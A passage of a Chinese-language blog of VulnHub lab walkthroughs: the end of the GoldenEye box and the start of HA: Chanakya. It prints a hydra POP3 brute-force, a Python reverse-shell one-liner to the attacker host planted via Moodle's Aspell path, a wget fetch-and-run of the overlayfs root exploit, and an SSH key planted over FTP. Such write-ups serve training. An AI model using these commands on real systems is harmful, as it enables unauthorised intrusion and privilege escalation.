<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub137.jpg"></p>
<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub138.jpg"></p>
<p>现在，我可以浏览到severnaya-station.com/gnocertdir以xenia的形式访问培训门户。学习门户使用开源学习平台Moodle托管。无法从门户访问任何课程资料或附件。但是，来自GoldenEye项目主管的Doak博士发了言。他在消息中说，他的电子邮件用户名不正确。我在pop3服务上使用hydra尝试了攻击。</p>
<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub139.jpg"></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># hydra -l doak -P /usr/share/wordlists/fasttrack.txt -t64 192.168.56.101 -s55007 -I pop3Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.</span></span><br><span class="line"></span><br><span class="line">Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-01-09 22:21:03</span><br><span class="line">[INFO] several providers have implemented cracking protection, check with a small wordlist first - and stay legal!</span><br><span class="line">[DATA] max 64 tasks per 1 server, overall 64 tasks, 222 login tries (l:1/p:222), ~4 tries per task</span><br><span class="line">[DATA] attacking pop3://192.168.56.101:55007/</span><br><span class="line">[55007][pop3] host: 192.168.56.101   login: doak   password: goat</span><br><span class="line">1 of 1 target successfully completed, 1 valid password found</span><br><span class="line">Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2020-01-09 22:21:32</span><br></pre></td></tr></table></figure>

<p>doak/goat,</p>
<p>那是特勤人员可以使用的最愚蠢的密码！不过，我可以使用新发现的凭据访问电子邮件通信。通过电子邮件通信，我发现了以代理Doak身份访问moodle的凭据。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># telnet 192.168.56.101 55007</span></span><br><span class="line">Trying 192.168.56.101...</span><br><span class="line">Connected to 192.168.56.101.</span><br><span class="line">Escape character is <span class="string">&#x27;^]&#x27;</span>.</span><br><span class="line">+OK GoldenEye POP3 Electronic-Mail System</span><br><span class="line">user doak</span><br><span class="line">+OK</span><br><span class="line">pass goat</span><br><span class="line">+OK Logged <span class="keyword">in</span>.</span><br><span class="line">retr 1</span><br><span class="line">+OK 606 octets</span><br><span class="line">Return-Path: &lt;doak@ubuntu&gt;</span><br><span class="line">X-Original-To: doak</span><br><span class="line">Delivered-To: doak@ubuntu</span><br><span class="line">Received: from doak (localhost [127.0.0.1])</span><br><span class="line">        by ubuntu (Postfix) with SMTP id 97DC24549D</span><br><span class="line">        <span class="keyword">for</span> &lt;doak&gt;; Tue, 30 Apr 1995 20:47:24 -0700 (PDT)</span><br><span class="line">Message-Id: &lt;20180425034731.97DC24549D@ubuntu&gt;</span><br><span class="line">Date: Tue, 30 Apr 1995 20:47:24 -0700 (PDT)</span><br><span class="line">From: doak@ubuntu</span><br><span class="line"></span><br><span class="line">James,</span><br><span class="line">If you<span class="string">&#x27;re reading this, congrats you&#x27;</span>ve gotten this far. You know how tradecraft works right?</span><br><span class="line"></span><br><span class="line">Because I don<span class="string">&#x27;t. Go to our training site and login to my account....dig until you can exfiltrate further information......</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">username: dr_doak</span></span><br><span class="line"><span class="string">password: 4England!</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">.</span></span><br></pre></td></tr></table></figure>

<p>username: dr_doak<br>password: 4England!</p>
<p>我在Doak博士的帐户中发现了一个有趣的附件，该附件说可以从/dir007key/for-007.jpg获取应用程序的管理员凭据。使用隐写术，可以将秘密消息嵌入图像中。</p>
<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub140.jpg"></p>
<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/007.jpg"></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># exiftool 007.jpg </span></span><br><span class="line">ExifTool Version Number         : 11.80</span><br><span class="line">File Name                       : 007.jpg</span><br><span class="line">Directory                       : .</span><br><span class="line">File Size                       : 15 kB</span><br><span class="line">File Modification Date/Time     : 2020:01:09 22:37:50-05:00</span><br><span class="line">File Access Date/Time           : 2020:01:09 22:37:50-05:00</span><br><span class="line">File Inode Change Date/Time     : 2020:01:09 22:37:50-05:00</span><br><span class="line">File Permissions                : rw-r--r--</span><br><span class="line">File Type                       : JPEG</span><br><span class="line">File Type Extension             : jpg</span><br><span class="line">MIME Type                       : image/jpeg</span><br><span class="line">JFIF Version                    : 1.01</span><br><span class="line">X Resolution                    : 300</span><br><span class="line">Y Resolution                    : 300</span><br><span class="line">Exif Byte Order                 : Big-endian (Motorola, MM)</span><br><span class="line">Image Description               : eFdpbnRlcjE5OTV4IQ==</span><br><span class="line">Make                            : GoldenEye</span><br><span class="line">Resolution Unit                 : inches</span><br><span class="line">Software                        : linux</span><br><span class="line">Artist                          : For James</span><br><span class="line">Y Cb Cr Positioning             : Centered</span><br><span class="line">Exif Version                    : 0231</span><br><span class="line">Components Configuration        : Y, Cb, Cr, -</span><br><span class="line">User Comment                    : For 007</span><br><span class="line">Flashpix Version                : 0100</span><br><span class="line">Image Width                     : 313</span><br><span class="line">Image Height                    : 212</span><br><span class="line">Encoding Process                : Baseline DCT, Huffman coding</span><br><span class="line">Bits Per Sample                 : 8</span><br><span class="line">Color Components                : 3</span><br><span class="line">Y Cb Cr Sub Sampling            : YCbCr4:4:4 (1 1)</span><br><span class="line">Image Size                      : 313x212</span><br><span class="line">Megapixels                      : 0.066</span><br></pre></td></tr></table></figure>

<p>将Image Description的base64字符串解码得到:xWinter1995x!</p>
<p>然后使用admin/xWinter1995x!登录即可</p>
<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub141.jpg"></p>
<h3 id="getshell"><a href="#getshell" class="headerlink" title="getshell"></a>getshell</h3><ul>
<li>moodle管理员账户远程代码执行</li>
</ul>
<p>在获得对moodle的管理员访问权后，获得reverse shell相当容易。在“moodle”设置上，存在用于配置系统路径的设置。Aspell是拼写检查器，可以安装在Linux上，并且可以在moodle中用于进行拼写检查操作。每当启动拼写检查动作时，moodle就会调用Aspell二进制文件。可以编辑Aspell的路径以获得reverse shell。以下是我使用的payload。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python -c <span class="string">&#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;192.168.56.102&quot;,5566));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&#x27;</span></span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub142.jpg"></p>
<p>正确设置路径后，即可创建任何博客文章或页面。在编辑器上，可以调用spellcheck函数以获得reverse shell连接。</p>
<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub143.jpg"></p>
<p>然后将下图所示设置选项设置成:PspellShell，不设置的话，无法执行之前的payload…</p>
<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub144.jpg"></p>
<p>点击上图的按钮之后kali端返回了shell.</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># nc -lvp 5566</span></span><br><span class="line">listening on [any] 5566 ...</span><br><span class="line">192.168.56.101: inverse host lookup failed: Host name lookup failure</span><br><span class="line">connect to [192.168.56.102] from (UNKNOWN) [192.168.56.101] 48087</span><br><span class="line">/bin/sh: 0: can<span class="string">&#x27;t access tty; job control turned off</span></span><br><span class="line"><span class="string">$ id</span></span><br><span class="line"><span class="string">uid=33(www-data) gid=33(www-data) groups=33(www-data)</span></span><br><span class="line"><span class="string">$ whoami</span></span><br><span class="line"><span class="string">www-data</span></span><br><span class="line"><span class="string">$ python -c &#x27;</span>import pty; pty.spawn(<span class="string">&quot;/bin/sh&quot;</span>)<span class="string">&#x27;</span></span><br></pre></td></tr></table></figure>

<h3 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h3><p>我首先列举了box的操作系统版本。那是一个Ubuntu 14.04.1 box。在Google的搜索中，我发现该机器容易受到overlayfs<span class="exturl" data-url="aHR0cHM6Ly93d3cuZXhwbG9pdC1kYi5jb20vZXhwbG9pdHMvMzcyOTI=">EDB-37292<i class="fa fa-external-link-alt"></i></span>攻击。我在kali上编译了它，然后将其转移到目标box中。运行漏洞利用程序时出现错误-sh：1：gcc：找不到。</p>
<p>目标框上没有gcc。如果我们检查exploit-db 37292漏洞利用代码，则在第143行上，您可以看到漏洞利用正在调用gcc。好吧，这很棘手。</p>
<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub145.jpg"></p>
<p>我使用linuxprivchecker.py枚举了该框，以枚举已安装的开发工具。box里没有gcc，但是有cc。cc是原始UNIX c编译器命令的名称。对于cc和gcc的确切区别，我不是专家。我尝试在漏洞利用源代码中将gcc更改为cc并进行编译。生成的二进制文件为我root了box。</p>
<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub146.jpg"></p>
<p>在kali中编译好exp后，直接wget下载到攻击机的shell中即可，然后赋予777权限，./exp执行，成功提权</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ wget http://192.168.56.102:8000/exp</span><br><span class="line">wget http://192.168.56.102:8000/exp</span><br><span class="line">--2020-01-10 06:24:47--  http://192.168.56.102:8000/exp</span><br><span class="line">Connecting to 192.168.56.102:8000... connected.</span><br><span class="line">HTTP request sent, awaiting response... 200 OK</span><br><span class="line">Length: 17616 (17K) [application/octet-stream]</span><br><span class="line">Saving to: <span class="string">&#x27;exp&#x27;</span></span><br><span class="line"></span><br><span class="line">100%[======================================&gt;] 17,616      --.-K/s   <span class="keyword">in</span> 0s      </span><br><span class="line"></span><br><span class="line">2020-01-10 06:24:47 (331 MB/s) - <span class="string">&#x27;exp&#x27;</span> saved [17616/17616]</span><br><span class="line"></span><br><span class="line">$ ls</span><br><span class="line">ls</span><br><span class="line">changelog.txt  config.php  editor_plugin.js      exp  includes</span><br><span class="line">classes        css         editor_plugin_src.js  img  rpc.php</span><br><span class="line">$ chmod 777 *</span><br><span class="line">chmod 777 *</span><br><span class="line">$ ./exp</span><br><span class="line">./exp</span><br><span class="line">spawning threads</span><br><span class="line">mount <span class="comment">#1</span></span><br><span class="line">mount <span class="comment">#2</span></span><br><span class="line">child threads <span class="keyword">done</span></span><br><span class="line">/etc/ld.so.preload created</span><br><span class="line">creating shared library</span><br><span class="line"><span class="comment"># id</span></span><br><span class="line">id</span><br><span class="line">uid=0(root) gid=0(root) groups=0(root),33(www-data)</span><br><span class="line"><span class="comment"># whoami</span></span><br><span class="line">whoami</span><br><span class="line">root</span><br></pre></td></tr></table></figure>

<p>找到flag，帅爆了。。。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># cd /root</span></span><br><span class="line"><span class="built_in">cd</span> /root</span><br><span class="line"><span class="comment"># ls</span></span><br><span class="line">ls</span><br><span class="line"><span class="comment"># pwd</span></span><br><span class="line"><span class="built_in">pwd</span></span><br><span class="line">/root</span><br><span class="line"><span class="comment"># ls -la</span></span><br><span class="line">ls -la</span><br><span class="line">total 44</span><br><span class="line">drwx------  3 root root 4096 Apr 29  2018 .</span><br><span class="line">drwxr-xr-x 22 root root 4096 Apr 24  2018 ..</span><br><span class="line">-rw-r--r--  1 root root   19 May  3  2018 .bash_history</span><br><span class="line">-rw-r--r--  1 root root 3106 Feb 19  2014 .bashrc</span><br><span class="line">drwx------  2 root root 4096 Apr 28  2018 .cache</span><br><span class="line">-rw-------  1 root root  144 Apr 29  2018 .flag.txt</span><br><span class="line">-rw-r--r--  1 root root  140 Feb 19  2014 .profile</span><br><span class="line">-rw-------  1 root root 1024 Apr 23  2018 .rnd</span><br><span class="line">-rw-------  1 root root 8296 Apr 29  2018 .viminfo</span><br><span class="line"><span class="comment"># cat .flag.txt</span></span><br><span class="line">cat .flag.txt</span><br><span class="line">Alec told me to place the codes here: </span><br><span class="line"></span><br><span class="line">568628e0d993b1973adc718237da6e93</span><br><span class="line"></span><br><span class="line">If you captured this make sure to go here.....</span><br><span class="line">/006-final/xvf7-flag/</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub147.jpg"></p>
<p>最后的flag是这个</p>
<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub148.jpg"></p>
<p>一张动图,蛮有意思的。</p>
<ul>
<li>知识点总结：</li>
</ul>
<p>1.telnet邮件泄露<br>2.图片隐写<br>3.moodle管理员账户远程代码执行<br>4.Ubuntu 14.04.1版本提权<br>5.exp overlayfs[EDB-37292] 编译cc执行</p>
<p><font color="red">Game over</font></p>
<p>不好意思，这次还是没有找到希腊某位大佬的傻瓜式一键通关脚本，i am so sorry about this…It’s a pity…</p>
<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/haha.jpg"></p>
<p><font color="green"><strong><em>The end,to be continue…</em></strong></font></p>
]]></content>
      <categories>
        <category>vulnhub walkthrough</category>
      </categories>
      <tags>
        <tag>vulnhub靶机练习</tag>
      </tags>
  </entry>
  <entry>
    <title>vulnhub靶机渗透[HA-Chanakya]</title>
    <url>/2019/12/16/HA-Chanakya/</url>
    <content><![CDATA[<p>名称：HA: Chanakya<br>发布日期：2019年11月9日</p>
<p>下载：</p>
<ul>
<li>Download: <span class="exturl" data-url="aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOUl5Q0FlOTFfRWVFTHdqVEZxb1o0X2Z3SEtVUk5CRDQvdmlldz91c3A9c2hhcmluZw==">https://drive.google.com/file/d/19IyCAe91_EeELwjTFqoZ4_fwHKURNBD4/view?usp=sharing<i class="fa fa-external-link-alt"></i></span></li>
<li>Download (Mirror): <span class="exturl" data-url="aHR0cHM6Ly9kb3dubG9hZC52dWxuaHViLmNvbS9oYS9jaGFuYWt5YS56aXA=">https://download.vulnhub.com/ha/chanakya.zip<i class="fa fa-external-link-alt"></i></span></li>
<li>Download (Torrent): <span class="exturl" data-url="aHR0cHM6Ly9kb3dubG9hZC52dWxuaHViLmNvbS9oYS9jaGFuYWt5YS56aXAudG9ycmVudA==">https://download.vulnhub.com/ha/chanakya.zip.torrent<i class="fa fa-external-link-alt"></i></span></li>
</ul>
<p>描述：</p>
<p>摧毁王国的策划者又回来了，这次他创造了一个难题，会让你挠头！ 是时候面对Chanakya。<br>您能否解决这个“从根本上启动”并证明自己比较明智？<br>枚举是关键！！！！</p>
<p>级别：中级</p>
<p>任务：枚举目标计算机并获得root用户访问权限。</p>
<a id="more"></a>

<h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><p>老规矩上nmap</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># nmap -sn -v 192.168.142.0/24</span></span><br><span class="line">Nmap scan report <span class="keyword">for</span> 192.168.142.130</span><br><span class="line">Host is up (0.00034s latency).</span><br><span class="line">MAC Address: 00:0C:29:BB:CA:D3 (VMware)</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># nmap -A -sV -Pn -T4 -v --script=vuln 192.168.142.130</span></span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">21/tcp open  ftp     pyftpdlib 1.0.0 or later</span><br><span class="line">|_clamav-exec: ERROR: Script execution failed (use -d to debug)</span><br><span class="line">|_sslv2-drown: </span><br><span class="line">22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">|_clamav-exec: ERROR: Script execution failed (use -d to debug)</span><br><span class="line">80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))</span><br><span class="line">|_clamav-exec: ERROR: Script execution failed (use -d to debug)</span><br><span class="line">|_http-csrf: Couldn<span class="string">&#x27;t find any CSRF vulnerabilities.</span></span><br><span class="line"><span class="string">|_http-dombased-xss: Couldn&#x27;</span>t find any DOM based XSS.</span><br><span class="line">| http-enum: </span><br><span class="line">|_  /images/: Potentially interesting directory w/ listing on <span class="string">&#x27;apache/2.4.29 (ubuntu)&#x27;</span></span><br><span class="line">| http-internal-ip-disclosure: </span><br><span class="line">|_  Internal IP Leaked: 127.0.1.1</span><br><span class="line">|_http-server-header: Apache/2.4.29 (Ubuntu)</span><br><span class="line">|_http-stored-xss: Couldn<span class="string">&#x27;t find any stored XSS vulnerabilities.</span></span><br><span class="line"><span class="string">| vulners: </span></span><br><span class="line"><span class="string">|   cpe:/a:apache:http_server:2.4.29: </span></span><br><span class="line"><span class="string">|       CVE-2019-0211   7.2     https://vulners.com/cve/CVE-2019-0211</span></span><br><span class="line"><span class="string">|       CVE-2018-1312   6.8     https://vulners.com/cve/CVE-2018-1312</span></span><br><span class="line"><span class="string">|       CVE-2017-15715  6.8     https://vulners.com/cve/CVE-2017-15715</span></span><br><span class="line"><span class="string">|       CVE-2019-10082  6.4     https://vulners.com/cve/CVE-2019-10082</span></span><br><span class="line"><span class="string">|       CVE-2019-0217   6.0     https://vulners.com/cve/CVE-2019-0217</span></span><br><span class="line"><span class="string">|       CVE-2019-10098  5.8     https://vulners.com/cve/CVE-2019-10098</span></span><br><span class="line"><span class="string">|       CVE-2019-10081  5.0     https://vulners.com/cve/CVE-2019-10081</span></span><br><span class="line"><span class="string">|       CVE-2019-0220   5.0     https://vulners.com/cve/CVE-2019-0220</span></span><br><span class="line"><span class="string">|       CVE-2019-0196   5.0     https://vulners.com/cve/CVE-2019-0196</span></span><br><span class="line"><span class="string">|       CVE-2018-17199  5.0     https://vulners.com/cve/CVE-2018-17199</span></span><br><span class="line"><span class="string">|       CVE-2018-1333   5.0     https://vulners.com/cve/CVE-2018-1333</span></span><br><span class="line"><span class="string">|       CVE-2017-15710  5.0     https://vulners.com/cve/CVE-2017-15710</span></span><br><span class="line"><span class="string">|       CVE-2019-0197   4.9     https://vulners.com/cve/CVE-2019-0197</span></span><br><span class="line"><span class="string">|       CVE-2019-10092  4.3     https://vulners.com/cve/CVE-2019-10092</span></span><br><span class="line"><span class="string">|       CVE-2018-11763  4.3     https://vulners.com/cve/CVE-2018-11763</span></span><br><span class="line"><span class="string">|_      CVE-2018-1283   3.5     https://vulners.com/cve/CVE-2018-1283</span></span><br></pre></td></tr></table></figure>

<p>dirb目录扫一波</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># dirb http://192.168.142.130/</span></span><br><span class="line"></span><br><span class="line">-----------------</span><br><span class="line">DIRB v2.22    </span><br><span class="line">By The Dark Raver</span><br><span class="line">-----------------</span><br><span class="line"></span><br><span class="line">START_TIME: Sun Dec 15 22:27:13 2019</span><br><span class="line">URL_BASE: http://192.168.142.130/</span><br><span class="line">WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt</span><br><span class="line"></span><br><span class="line">-----------------</span><br><span class="line"></span><br><span class="line">GENERATED WORDS: 4612                                                          </span><br><span class="line"></span><br><span class="line">---- Scanning URL: http://192.168.142.130/ ----</span><br><span class="line">==&gt; DIRECTORY: http://192.168.142.130/assets/                                                         </span><br><span class="line">==&gt; DIRECTORY: http://192.168.142.130/images/                                                         </span><br><span class="line">+ http://192.168.142.130/index.html (CODE:200|SIZE:2382)                                              </span><br><span class="line">+ http://192.168.142.130/server-status (CODE:403|SIZE:280)</span><br><span class="line"></span><br><span class="line">root@kali:~<span class="comment"># dirb http://192.168.142.130/ -X .txt</span></span><br><span class="line"></span><br><span class="line">-----------------</span><br><span class="line">DIRB v2.22    </span><br><span class="line">By The Dark Raver</span><br><span class="line">-----------------</span><br><span class="line"></span><br><span class="line">START_TIME: Sun Dec 15 22:28:34 2019</span><br><span class="line">URL_BASE: http://192.168.142.130/</span><br><span class="line">WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt</span><br><span class="line">EXTENSIONS_LIST: (.txt) | (.txt) [NUM = 1]</span><br><span class="line"></span><br><span class="line">-----------------</span><br><span class="line"></span><br><span class="line">GENERATED WORDS: 4612                                                          </span><br><span class="line"></span><br><span class="line">---- Scanning URL: http://192.168.142.130/ ----</span><br><span class="line">+ http://192.168.142.130/abuse.txt (CODE:200|SIZE:14)</span><br></pre></td></tr></table></figure>

<p>访问该txt文件发现如下内容</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nfubxn.cpncat</span><br></pre></td></tr></table></figure>

<p>使用<span class="exturl" data-url="aHR0cHM6Ly9yb3QxMy5jb20v">rot13.com<i class="fa fa-external-link-alt"></i></span>进行rot13解密，解密出来是ashoka.pcapng，然后访问(<span class="exturl" data-url="aHR0cDovLzE5Mi4xNjguMTQyLjEzMC9hc2hva2EucGNhcG5nKSwlRTUlQjAlODYlRTYlQUQlQTQlRTYlOTYlODclRTQlQkIlQjYlRTQlQjglOEIlRTglQkQlQkQlRUYlQkMlOEMlRTclODQlQjYlRTUlOTAlOEV3aXJlc2hhcmslRTYlODklOTMlRTUlQkMlODAlRTglQUYlQTUlRTYlOTYlODclRTQlQkIlQjYlRTMlODAlODI=">http://192.168.142.130/ashoka.pcapng),将此文件下载，然后wireshark打开该文件。<i class="fa fa-external-link-alt"></i></span></p>
<p>在Wireshark中打开捕获的文件，然后跟随ftp流量的tcp流，并获得ftp的用户名ashoka和密码kautilya。</p>
<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub63.jpg"></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">220 pyftpdlib based ftpd ready.</span><br><span class="line">USER ashoka</span><br><span class="line">331 Username ok, send password.</span><br><span class="line">PASS kautilya</span><br><span class="line">230 Login successful.</span><br><span class="line">SYST</span><br><span class="line">215 UNIX Type: L8</span><br><span class="line">FEAT</span><br><span class="line">211-Features supported:</span><br><span class="line"> EPRT</span><br><span class="line"> EPSV</span><br><span class="line"> MDTM</span><br><span class="line"> MLST <span class="built_in">type</span>*;perm*;size*;modify*;unique*;unix.mode;unix.uid;unix.gid;</span><br><span class="line"> REST STREAM</span><br><span class="line"> SIZE</span><br><span class="line"> TVFS</span><br><span class="line"> UTF8</span><br><span class="line">211 End FEAT.</span><br><span class="line">OPTS UTF8 ON</span><br><span class="line">501 Invalid argument.</span><br><span class="line">PWD</span><br><span class="line">257 <span class="string">&quot;/&quot;</span> is the current directory.</span><br><span class="line">TYPE A</span><br><span class="line">200 Type <span class="built_in">set</span> to: ASCII.</span><br><span class="line">PASV</span><br><span class="line">227 Entering passive mode (192,168,1,101,177,201).</span><br><span class="line">MLSD</span><br><span class="line">150 File status okay. About to open data connection.</span><br><span class="line">226 Transfer complete.</span><br></pre></td></tr></table></figure>

<p>现在有了FTP登录凭据，登录到FTP服务器。 登录后，运行ls命令环顾四周。 发现在根目录中。 因此，决定通过将SSH放置在此位置来完成ssh的操作。 为此，创建一个名为“ .ssh”的目录。 遍历这个新创建的目录后，回到本机终端。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># ftp 192.168.142.130</span></span><br><span class="line">Connected to 192.168.142.130.</span><br><span class="line">220 pyftpdlib based ftpd ready.</span><br><span class="line">Name (192.168.142.130:root): ashoka</span><br><span class="line">331 Username ok, send password.</span><br><span class="line">Password:</span><br><span class="line">230 Login successful.</span><br><span class="line">Remote system <span class="built_in">type</span> is UNIX.</span><br><span class="line">Using binary mode to transfer files.</span><br><span class="line">ftp&gt; ls</span><br><span class="line">200 Active data connection established.</span><br><span class="line">125 Data connection already open. Transfer starting.</span><br><span class="line">-rw-------   1 ashoka   ashoka          1 Nov 05 15:57 .bash_history</span><br><span class="line">-rw-r--r--   1 ashoka   ashoka        220 Nov 05 14:05 .bash_logout</span><br><span class="line">-rw-r--r--   1 ashoka   ashoka       3771 Nov 05 14:05 .bashrc</span><br><span class="line">drwx------   2 ashoka   ashoka       4096 Nov 05 14:18 .cache</span><br><span class="line">drwxrwxr-x   3 ashoka   ashoka       4096 Nov 05 14:26 .<span class="built_in">local</span></span><br><span class="line">-rw-r--r--   1 ashoka   ashoka        807 Nov 05 14:05 .profile</span><br><span class="line">226 Transfer complete.</span><br><span class="line">ftp&gt; mkdir .ssh</span><br><span class="line">257 <span class="string">&quot;/.ssh&quot;</span> directory created.</span><br><span class="line">ftp&gt; <span class="built_in">cd</span> .ssh</span><br><span class="line">250 <span class="string">&quot;/.ssh&quot;</span> is the current directory.</span><br></pre></td></tr></table></figure>

<p>现在该生成一些ssh密钥了。 使用ssh-keygen创建了一些密钥。 输入的密码为“ 123”。 这可以是您选择的任何东西。 将其保留下来以便于记忆。 在创建密钥之后继续前进，进入了本机shell程序的.ssh目录。 在这里，看到了名为“ id_rsa.pub”的密钥。 现在需要将此密钥上传到FTP，因此将is_rsa.pub的内容复制到名为authorized_keys的文件中。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~/.ssh<span class="comment"># ls</span></span><br><span class="line">id_rsa  id_rsa.pub  known_hosts</span><br><span class="line">root@kali:~/.ssh<span class="comment"># cat id_rsa.pub &gt; authorized_keys</span></span><br><span class="line">root@kali:~/.ssh<span class="comment"># ls</span></span><br><span class="line">authorized_keys  id_rsa  id_rsa.pub  known_hosts</span><br><span class="line">root@kali:~/.ssh<span class="comment"># cat id_rsa.pub</span></span><br><span class="line">ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDTIuh8j20bp4uFWWmOn9IXRvRYDVvBjARjPeCZ7o00nnwTzJ/Y1OBU1AoDVNIq6aM/CVJ9qCy0zceqNfC1roGUM+cvUVO+qR5aG+QnT8mxdRnoXin+JAk8nFuynJ63016zuauB0iQUwyQ9dRm+jzW9+J/9S86Fd/qcbKNYbW5wn9Chh3T+bj+T+6RCKlU7q6q+Kc1S4WfI7iXJ6doR9hxD91CRUVWG/KyADbZuWsTuDyxxrQ/KA8ek05owsokgIc9rS8ZjtB23rR1yai/B3hfjjQgKMQkF6k9D7J6Qm07VgDZkYm4RTxlO8bDDnfkNOBs9rzBomPrN2rOeounir4ZIj+dDDpH9tGklDLyCW6RKx8fiN/s9z5Knf61a+9nielEO8DUqaEt+bHTl/3uVimZ01upoLEamclLadpMSBfT6CccUnD2bu4Kcb9kcOjHTW4pQEL9BXSu+upvQDJyRsPxy1JLNZ5xdkJoQKyt5OArNjUq7SsVAOZzNQRaM3JGit9s= root@kali</span><br><span class="line">root@kali:~/.ssh<span class="comment"># cat authorized_keys </span></span><br><span class="line">ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDTIuh8j20bp4uFWWmOn9IXRvRYDVvBjARjPeCZ7o00nnwTzJ/Y1OBU1AoDVNIq6aM/CVJ9qCy0zceqNfC1roGUM+cvUVO+qR5aG+QnT8mxdRnoXin+JAk8nFuynJ63016zuauB0iQUwyQ9dRm+jzW9+J/9S86Fd/qcbKNYbW5wn9Chh3T+bj+T+6RCKlU7q6q+Kc1S4WfI7iXJ6doR9hxD91CRUVWG/KyADbZuWsTuDyxxrQ/KA8ek05owsokgIc9rS8ZjtB23rR1yai/B3hfjjQgKMQkF6k9D7J6Qm07VgDZkYm4RTxlO8bDDnfkNOBs9rzBomPrN2rOeounir4ZIj+dDDpH9tGklDLyCW6RKx8fiN/s9z5Knf61a+9nielEO8DUqaEt+bHTl/3uVimZ01upoLEamclLadpMSBfT6CccUnD2bu4Kcb9kcOjHTW4pQEL9BXSu+upvQDJyRsPxy1JLNZ5xdkJoQKyt5OArNjUq7SsVAOZzNQRaM3JGit9s= root@kali</span><br><span class="line">root@kali:~/.ssh<span class="comment"># ls</span></span><br><span class="line">authorized_keys  id_rsa  id_rsa.pub  known_hosts</span><br></pre></td></tr></table></figure>
<p>使用put命令将文件传输到目标计算机</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ftp&gt; put authorized_keys </span><br><span class="line"><span class="built_in">local</span>: authorized_keys remote: authorized_keys</span><br><span class="line">200 Active data connection established.</span><br><span class="line">125 Data connection already open. Transfer starting.</span><br><span class="line">226 Transfer complete.</span><br><span class="line">563 bytes sent <span class="keyword">in</span> 0.00 secs (14.5113 MB/s)</span><br><span class="line">ftp&gt; ls</span><br><span class="line">200 Active data connection established.</span><br><span class="line">125 Data connection already open. Transfer starting.</span><br><span class="line">-rw-r--r--   1 root     root          563 Dec 16 05:30 authorized_keys</span><br><span class="line">226 Transfer complete.</span><br></pre></td></tr></table></figure>

<p>现在，使用ssh连接到目标计算机。 由于之前放置了授权密钥，因此现在可以登录。 得到了Ashoka用户的shell。 经过一些枚举，看到临时文件中有一个日志文件。 尝试使用cat命令。 看起来像Chkrootkit测试结果日志。 这提示也许可以使用Chkrootkit在此计算机上升级特权。</p>
